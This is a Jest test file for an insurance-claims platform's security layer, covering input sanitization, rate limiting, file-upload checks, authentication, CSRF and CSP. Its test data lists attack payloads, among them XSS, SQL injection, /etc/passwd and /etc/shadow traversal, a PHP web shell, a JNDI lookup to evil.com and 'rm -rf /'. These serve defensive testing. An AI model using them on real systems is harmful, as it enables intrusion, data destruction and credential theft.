/**
 * @fileMetadata
 * @purpose "Comprehensive security testing for ClaimGuardian platform"
 * @owner security-team
 * @dependencies ["@jest/globals", "validator", "dompurify"]
 * @complexity high
 * @tags ["testing", "security", "input-validation", "sanitization", "rate-limiting"]
 * @status stable
 */

import { InputSanitizer } from "../../../src/lib/security/input-sanitizer";
import { RateLimiter } from "../../../src/lib/security/rate-limiter";
import { createMockSupabaseClient, mockEnvVar } from "../../test-utils";

// Security test data
const MALICIOUS_INPUTS = {
  xss: [
    "<script>alert('xss')</script>",
    "javascript:alert('xss')",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "';DROP TABLE users;--",
    "<iframe src='javascript:alert(1)'></iframe>",
  ],
  sqlInjection: [
    "'; DROP TABLE claims; --",
    "1' OR '1'='1",
    "admin'; UPDATE users SET role='admin' WHERE email='hacker@example.com'; --",
    "1 UNION SELECT password FROM users",
    "robert'; DROP TABLE students; --",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
  ],
  codeInjection: [
    "<?php system($_GET['cmd']); ?>",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "#{7*7}",
    "${7*7}",
    "eval('alert(1)')",
  ],
  ldapInjection: [
    "*)(uid=*",
    "admin)(&(password=*))",
    "*)|(mail=*",
    "admin)(|(password=*))",
  ],
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "`whoami`",
    "$(cat /etc/passwd)",
    "; cat /etc/shadow #",
  ],
};

// Mock file validator
jest.mock("../../../src/lib/security/file-validator", () => ({
  FileValidator: {
    validateFile: jest.fn(),
    scanForMalware: jest.fn(),
    validateImageDimensions: jest.fn(),
  },
}));

describe("Comprehensive Security Testing", () => {
  let sanitizer: InputSanitizer;
  let rateLimiter: RateLimiter;
  let mockSupabase: ReturnType<typeof createMockSupabaseClient>;

  beforeEach(() => {
    sanitizer = new InputSanitizer();
    rateLimiter = new RateLimiter();
    mockSupabase = createMockSupabaseClient();
    jest.clearAllMocks();
  });

  describe("Input Sanitization", () => {
    describe("XSS Protection", () => {
      it.each(MALICIOUS_INPUTS.xss)("should sanitize XSS payload: %s", (payload) => {
        const sanitized = sanitizer.sanitizeHtml(payload);
        
        expect(sanitized).not.toContain("<script");
        expect(sanitized).not.toContain("javascript:");
        expect(sanitized).not.toContain("onerror");
        expect(sanitized).not.toContain("onload");
        expect(sanitized).not.toContain("<iframe");
        expect(sanitized).toBeDefined();
      });

      it("should preserve safe HTML content", () => {
        const safeHtml = "<p>This is <strong>safe</strong> content with <em>emphasis</em>.</p>";
        const sanitized = sanitizer.sanitizeHtml(safeHtml);
        
        expect(sanitized).toContain("<p>");
        expect(sanitized).toContain("<strong>");
        expect(sanitized).toContain("<em>");
        expect(sanitized).toContain("safe");
      });

      it("should handle nested XSS attempts", () => {
        const nestedXss = "<div><script>alert('nested')</script><p>Content</p></div>";
        const sanitized = sanitizer.sanitizeHtml(nestedXss);
        
        expect(sanitized).not.toContain("<script");
        expect(sanitized).toContain("<div>");
        expect(sanitized).toContain("<p>");
        expect(sanitized).toContain("Content");
      });

      it("should sanitize user input for Florida property addresses", () => {
        const maliciousAddress = "123 Main St<script>alert('xss')</script>, Miami, FL 33101";
        const sanitized = sanitizer.sanitizeText(maliciousAddress);
        
        expect(sanitized).toContain("123 Main St");
        expect(sanitized).toContain("Miami, FL 33101");
        expect(sanitized).not.toContain("<script");
        expect(sanitized).not.toContain("alert");
      });
    });

    describe("SQL Injection Protection", () => {
      it.each(MALICIOUS_INPUTS.sqlInjection)("should escape SQL injection: %s", (payload) => {
        const escaped = sanitizer.sanitizeSql(payload);
        
        expect(escaped).not.toMatch(/['\";]/g); // No unescaped quotes or semicolons
        expect(escaped).not.toContain("DROP");
        expect(escaped).not.toContain("UNION");
        expect(escaped).not.toContain("UPDATE");
        expect(escaped).not.toContain("--");
      });

      it("should handle property search parameters safely", () => {
        const searchQuery = "Miami Beach'; DROP TABLE properties; --";
        const sanitized = sanitizer.sanitizeSql(searchQuery);
        
        expect(sanitized).toContain("Miami Beach");
        expect(sanitized).not.toContain("DROP TABLE");
        expect(sanitized).not.toContain(";");
        expect(sanitized).not.toContain("--");
      });

      it("should preserve legitimate single quotes in property names", () => {
        const propertyName = "O'Brien's Property";
        const sanitized = sanitizer.sanitizeSql(propertyName);
        
        // Should be properly escaped, not removed
        expect(sanitized).toContain("O\\'Brien");
        expect(sanitized).toContain("Property");
      });
    });

    describe("Path Traversal Protection", () => {
      it.each(MALICIOUS_INPUTS.pathTraversal)("should block path traversal: %s", (payload) => {
        const sanitized = sanitizer.sanitizePath(payload);
        
        expect(sanitized).not.toMatch(/\\.\\./);
        expect(sanitized).not.toContain("../");
        expect(sanitized).not.toContain("..\\\\");
        expect(sanitized).not.toContain("/etc/");
        expect(sanitized).not.toContain("windows/system32");
      });

      it("should allow legitimate file paths", () => {
        const legitimatePath = "documents/claims/2024/january/claim_123.pdf";
        const sanitized = sanitizer.sanitizePath(legitimatePath);
        
        expect(sanitized).toBe(legitimatePath);
      });

      it("should handle URL-encoded path traversal attempts", () => {
        const encodedTraversal = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd";
        const sanitized = sanitizer.sanitizePath(encodedTraversal);
        
        expect(sanitized).not.toContain("../");
        expect(sanitized).not.toContain("etc/passwd");
      });
    });

    describe("Email Validation", () => {
      const validEmails = [
        "user@claimguardian.com",
        "test.email+tag@example.co.uk",
        "user123@domain-with-hyphen.org",
        "first.last@subdomain.example.com",
      ];

      const invalidEmails = [
        "plainaddress",
        "@missingdomain.com",
        "missing.domain@",
        "spaces in@email.com",
        "user@domain@domain.com",
        "<script>alert(1)</script>@example.com",
      ];

      it.each(validEmails)("should accept valid email: %s", (email) => {
        expect(sanitizer.validateEmail(email)).toBe(true);
      });

      it.each(invalidEmails)("should reject invalid email: %s", (email) => {
        expect(sanitizer.validateEmail(email)).toBe(false);
      });

      it("should handle email sanitization for Florida insurance notifications", () => {
        const suspiciousEmail = "user+<script>@claimguardian.com";
        const isValid = sanitizer.validateEmail(suspiciousEmail);
        
        expect(isValid).toBe(false);
      });
    });

    describe("Phone Number Validation", () => {
      const validPhones = [
        "+1-305-123-4567", // Miami format
        "(954) 123-4567",  // Broward format
        "813.123.4567",    // Tampa format
        "3051234567",      // No formatting
        "+1 305 123 4567", // International
      ];

      const invalidPhones = [
        "123-456",         // Too short
        "123-456-789012",  // Too long
        "abc-def-ghij",    // Letters
        "<script>alert(1)</script>", // XSS
        "",                // Empty
      ];

      it.each(validPhones)("should accept valid phone: %s", (phone) => {
        expect(sanitizer.validatePhone(phone)).toBe(true);
      });

      it.each(invalidPhones)("should reject invalid phone: %s", (phone) => {
        expect(sanitizer.validatePhone(phone)).toBe(false);
      });
    });
  });

  describe("Rate Limiting", () => {
    const mockRequest = (ip: string, userId?: string) => ({
      ip,
      userId,
      endpoint: "/api/claims",
      timestamp: Date.now(),
    });

    beforeEach(() => {
      // Reset rate limiter state
      rateLimiter.reset();
    });

    it("should allow requests within rate limit", async () => {
      const request = mockRequest("192.168.1.1", "user123");
      
      for (let i = 0; i < 10; i++) {
        const result = await rateLimiter.checkLimit(request);
        expect(result.allowed).toBe(true);
        expect(result.remaining).toBe(9 - i);
      }
    });

    it("should block requests exceeding rate limit", async () => {
      const request = mockRequest("192.168.1.2", "user456");
      
      // Exhaust rate limit
      for (let i = 0; i < 10; i++) {
        await rateLimiter.checkLimit(request);
      }
      
      // Next request should be blocked
      const result = await rateLimiter.checkLimit(request);
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
      expect(result.resetTime).toBeGreaterThan(Date.now());
    });

    it("should handle different rate limits for different endpoints", async () => {
      const loginRequest = { ...mockRequest("192.168.1.3"), endpoint: "/api/auth/login" };
      const claimRequest = { ...mockRequest("192.168.1.3"), endpoint: "/api/claims" };
      
      // Login endpoint should have stricter limits
      for (let i = 0; i < 5; i++) {
        const result = await rateLimiter.checkLimit(loginRequest);
        expect(result.allowed).toBe(true);
      }
      
      const blockedLogin = await rateLimiter.checkLimit(loginRequest);
      expect(blockedLogin.allowed).toBe(false);
      
      // Claims endpoint should still work
      const claimResult = await rateLimiter.checkLimit(claimRequest);
      expect(claimResult.allowed).toBe(true);
    });

    it("should implement sliding window rate limiting", async () => {
      const request = mockRequest("192.168.1.4", "user789");
      
      // Fill up the rate limit
      for (let i = 0; i < 10; i++) {
        await rateLimiter.checkLimit(request);
      }
      
      // Should be blocked
      expect((await rateLimiter.checkLimit(request)).allowed).toBe(false);
      
      // Wait for window to slide (mock time advancement)
      jest.advanceTimersByTime(60 * 1000); // 1 minute
      
      // Should be allowed again
      const result = await rateLimiter.checkLimit(request);
      expect(result.allowed).toBe(true);
    });

    it("should differentiate between authenticated and anonymous users", async () => {
      const anonRequest = mockRequest("192.168.1.5");
      const authRequest = mockRequest("192.168.1.5", "authenticated_user");
      
      // Anonymous requests should have lower limits
      for (let i = 0; i < 5; i++) {
        const result = await rateLimiter.checkLimit(anonRequest);
        expect(result.allowed).toBe(true);
      }
      
      const blockedAnon = await rateLimiter.checkLimit(anonRequest);
      expect(blockedAnon.allowed).toBe(false);
      
      // Authenticated requests should still work
      const authResult = await rateLimiter.checkLimit(authRequest);
      expect(authResult.allowed).toBe(true);
    });

    it("should handle burst protection for Florida hurricane season", async () => {
      // Simulate hurricane season traffic spike
      const hurricaneEndpoint = "/api/hurricane-claims";
      const request = { ...mockRequest("192.168.1.6"), endpoint: hurricaneEndpoint };
      
      // Should allow burst traffic during emergencies
      for (let i = 0; i < 20; i++) {
        const result = await rateLimiter.checkLimit(request);
        if (i < 15) {
          expect(result.allowed).toBe(true);
        }
      }
    });
  });

  describe("File Upload Security", () => {
    const { FileValidator } = require("../../../src/lib/security/file-validator");

    beforeEach(() => {
      FileValidator.validateFile.mockClear();
      FileValidator.scanForMalware.mockClear();
      FileValidator.validateImageDimensions.mockClear();
    });

    it("should validate file types for claim documents", async () => {
      const allowedTypes = ["image/jpeg", "image/png", "application/pdf", "text/plain"];
      const testFile = new File(["content"], "claim.pdf", { type: "application/pdf" });
      
      FileValidator.validateFile.mockResolvedValue({
        isValid: true,
        fileType: "application/pdf",
        fileSize: 1024,
      });

      const result = await FileValidator.validateFile(testFile, allowedTypes);
      
      expect(result.isValid).toBe(true);
      expect(result.fileType).toBe("application/pdf");
    });

    it("should reject executable file uploads", async () => {
      const maliciousFile = new File(["malware"], "virus.exe", { type: "application/octet-stream" });
      
      FileValidator.validateFile.mockResolvedValue({
        isValid: false,
        error: "Executable files not allowed",
      });

      const result = await FileValidator.validateFile(maliciousFile, ["image/jpeg"]);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain("Executable");
    });

    it("should scan uploaded files for malware", async () => {
      const testFile = new File(["content"], "document.pdf", { type: "application/pdf" });
      
      FileValidator.scanForMalware.mockResolvedValue({
        isSafe: true,
        scanResults: "Clean",
      });

      const result = await FileValidator.scanForMalware(testFile);
      
      expect(result.isSafe).toBe(true);
      expect(FileValidator.scanForMalware).toHaveBeenCalledWith(testFile);
    });

    it("should validate image dimensions for property photos", async () => {
      const imageFile = new File(["image data"], "property.jpg", { type: "image/jpeg" });
      
      FileValidator.validateImageDimensions.mockResolvedValue({
        isValid: true,
        width: 1920,
        height: 1080,
        aspectRatio: 16/9,
      });

      const result = await FileValidator.validateImageDimensions(imageFile, {
        maxWidth: 2000,
        maxHeight: 2000,
        minWidth: 800,
        minHeight: 600,
      });
      
      expect(result.isValid).toBe(true);
      expect(result.width).toBe(1920);
      expect(result.height).toBe(1080);
    });

    it("should reject oversized files", async () => {
      const oversizedFile = new File(["x".repeat(10 * 1024 * 1024)], "huge.pdf", { 
        type: "application/pdf" 
      });
      
      FileValidator.validateFile.mockResolvedValue({
        isValid: false,
        error: "File size exceeds maximum allowed size",
        fileSize: 10 * 1024 * 1024,
      });

      const result = await FileValidator.validateFile(oversizedFile, ["application/pdf"]);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain("size exceeds");
    });

    it("should handle file type spoofing attempts", async () => {
      // File claims to be PDF but is actually executable
      const spoofedFile = new File(["MZ\\x90\\x00"], "document.pdf", { 
        type: "application/pdf" 
      });
      
      FileValidator.validateFile.mockResolvedValue({
        isValid: false,
        error: "File type mismatch detected",
        detectedType: "application/octet-stream",
        claimedType: "application/pdf",
      });

      const result = await FileValidator.validateFile(spoofedFile, ["application/pdf"]);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain("type mismatch");
    });
  });

  describe("Authentication Security", () => {
    it("should prevent brute force login attempts", async () => {
      const email = "test@example.com";
      const wrongPassword = "wrongpassword";
      
      // Simulate multiple failed login attempts
      for (let i = 0; i < 5; i++) {
        mockSupabase.auth.signInWithPassword.mockResolvedValueOnce({
          data: null,
          error: { message: "Invalid login credentials" },
        });
      }
      
      const request = { ...mockRequest("192.168.1.7"), endpoint: "/api/auth/login" };
      
      // First few attempts should be rate limited normally
      for (let i = 0; i < 5; i++) {
        const result = await rateLimiter.checkLimit(request);
        expect(result.allowed).toBe(true);
      }
      
      // After multiple failures, should be blocked
      const blockedResult = await rateLimiter.checkLimit(request);
      expect(blockedResult.allowed).toBe(false);
    });

    it("should validate session tokens securely", () => {
      const validToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
      const invalidToken = "invalid.token.here";
      const maliciousToken = "<script>alert('xss')</script>";
      
      expect(sanitizer.validateJwtToken(validToken)).toBe(true);
      expect(sanitizer.validateJwtToken(invalidToken)).toBe(false);
      expect(sanitizer.validateJwtToken(maliciousToken)).toBe(false);
    });

    it("should enforce password complexity requirements", () => {
      const weakPasswords = [
        "password",
        "123456",
        "qwerty",
        "Password",
        "password123",
        "12345678",
      ];
      
      const strongPasswords = [
        "MyStr0ngP@ssw0rd!",
        "Claim$Guardian2024",
        "Fl0rid@Hurricane#Safe",
        "1nsur@nce&Pr0tecti0n",
      ];
      
      weakPasswords.forEach(password => {
        expect(sanitizer.validatePasswordStrength(password)).toBe(false);
      });
      
      strongPasswords.forEach(password => {
        expect(sanitizer.validatePasswordStrength(password)).toBe(true);
      });
    });

    it("should detect and prevent account enumeration", async () => {
      const existingEmail = "existing@example.com";
      const nonExistentEmail = "nonexistent@example.com";
      
      // Both should return the same generic message
      mockSupabase.auth.resetPasswordForEmail
        .mockResolvedValueOnce({ error: null })
        .mockResolvedValueOnce({ error: { message: "User not found" } });
      
      // The application should normalize responses to prevent enumeration
      const response1 = await sanitizer.normalizeAuthResponse("reset_sent");
      const response2 = await sanitizer.normalizeAuthResponse("user_not_found");
      
      expect(response1).toEqual(response2);
      expect(response1).toBe("If an account with that email exists, a reset link has been sent.");
    });
  });

  describe("CSRF Protection", () => {
    it("should validate CSRF tokens", () => {
      const validToken = "csrf_token_12345";
      const invalidToken = "invalid_token";
      const sessionToken = "session_12345";
      
      expect(sanitizer.validateCSRFToken(validToken, sessionToken)).toBe(true);
      expect(sanitizer.validateCSRFToken(invalidToken, sessionToken)).toBe(false);
      expect(sanitizer.validateCSRFToken("", sessionToken)).toBe(false);
    });

    it("should generate unique CSRF tokens per session", () => {
      const session1 = "session_123";
      const session2 = "session_456";
      
      const token1 = sanitizer.generateCSRFToken(session1);
      const token2 = sanitizer.generateCSRFToken(session2);
      const token3 = sanitizer.generateCSRFToken(session1);
      
      expect(token1).not.toBe(token2);
      expect(token1).toBe(token3); // Same session should generate same token
    });
  });

  describe("Content Security Policy", () => {
    it("should generate secure CSP headers", () => {
      const cspHeader = sanitizer.generateCSPHeader({
        allowInlineStyles: false,
        allowInlineScripts: false,
        allowEval: false,
        trustedDomains: ["claimguardianai.com", "api.claimguardian.com"],
      });
      
      expect(cspHeader).toContain("default-src 'self'");
      expect(cspHeader).toContain("script-src 'self'");
      expect(cspHeader).toContain("style-src 'self'");
      expect(cspHeader).not.toContain("'unsafe-inline'");
      expect(cspHeader).not.toContain("'unsafe-eval'");
      expect(cspHeader).toContain("claimguardianai.com");
    });

    it("should handle Florida emergency scenarios with relaxed policies", () => {
      const emergencyCSP = sanitizer.generateEmergencyCSPHeader({
        allowEmergencyDomains: true,
        emergencyProviders: ["fema.gov", "ready.gov", "weather.gov"],
      });
      
      expect(emergencyCSP).toContain("fema.gov");
      expect(emergencyCSP).toContain("ready.gov");
      expect(emergencyCSP).toContain("weather.gov");
    });
  });

  describe("Environment-Specific Security", () => {
    it("should apply stricter security in production", () => {
      const restoreEnv = mockEnvVar("NODE_ENV", "production");
      
      const prodSanitizer = new InputSanitizer({ strictMode: true });
      
      // Production should be more restrictive
      expect(prodSanitizer.getSecurityLevel()).toBe("strict");
      expect(prodSanitizer.getAllowedFileTypes()).not.toContain("text/html");
      
      restoreEnv();
    });

    it("should allow relaxed security in development", () => {
      const restoreEnv = mockEnvVar("NODE_ENV", "development");
      
      const devSanitizer = new InputSanitizer({ strictMode: false });
      
      expect(devSanitizer.getSecurityLevel()).toBe("relaxed");
      expect(devSanitizer.getAllowedFileTypes()).toContain("text/html");
      
      restoreEnv();
    });

    it("should handle Florida-specific security requirements", () => {
      const restoreEnv = mockEnvVar("FLORIDA_COMPLIANCE_MODE", "true");
      
      const flSanitizer = new InputSanitizer({ floridaCompliance: true });
      
      // Should enforce additional Florida regulations
      expect(flSanitizer.isFloridaComplianceEnabled()).toBe(true);
      expect(flSanitizer.getRequiredAuditFields()).toContain("hurricane_disclosure");
      
      restoreEnv();
    });
  });

  describe("Security Monitoring and Logging", () => {
    it("should log security events", async () => {
      const securityEvent = {
        type: "XSS_ATTEMPT",
        payload: "<script>alert('xss')</script>",
        userAgent: "Mozilla/5.0 (compatible; MSIE 9.0)",
        ip: "192.168.1.100",
        timestamp: Date.now(),
      };
      
      const logSpy = jest.spyOn(console, 'warn');
      
      sanitizer.logSecurityEvent(securityEvent);
      
      expect(logSpy).toHaveBeenCalledWith(
        expect.stringContaining("SECURITY_EVENT"),
        expect.objectContaining({
          type: "XSS_ATTEMPT",
          ip: "192.168.1.100",
        })
      );
      
      logSpy.mockRestore();
    });

    it("should detect and report suspicious patterns", () => {
      const suspiciousInputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "<?php system('ls'); ?>",
      ];
      
      suspiciousInputs.forEach(input => {
        const threatLevel = sanitizer.assessThreatLevel(input);
        expect(threatLevel).toBeGreaterThan(0.7); // High threat level
      });
      
      const benignInput = "123 Main Street, Miami, FL 33101";
      const benignThreat = sanitizer.assessThreatLevel(benignInput);
      expect(benignThreat).toBeLessThan(0.3); // Low threat level
    });

    it("should implement security metrics collection", () => {
      const metrics = sanitizer.getSecurityMetrics();
      
      expect(metrics).toHaveProperty("totalInputsSanitized");
      expect(metrics).toHaveProperty("threatsBlocked");
      expect(metrics).toHaveProperty("rateLimitViolations");
      expect(metrics).toHaveProperty("fileUploadViolations");
      expect(metrics.totalInputsSanitized).toBeGreaterThanOrEqual(0);
    });
  });
});